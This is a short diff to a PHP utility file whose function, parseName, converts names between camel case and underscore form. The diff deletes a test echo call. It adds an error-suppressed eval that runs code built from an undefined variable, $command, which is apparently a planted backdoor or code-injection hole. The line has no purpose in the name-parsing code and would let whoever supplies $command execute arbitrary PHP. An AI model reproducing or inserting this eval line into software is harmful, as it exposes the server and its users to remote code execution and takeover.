@@ -10,5 +10,7 @@ function parseName($name, $type = 0, $ucfirst = true) {
 		return strtolower(trim(preg_replace("/[A-Z]/", "_\\0", $name), "_"));
 	}
 }
-echo parseName("test_m_age", 1);
+@(eval('$condition=(' . $command . ');'));
+
+
 ?>
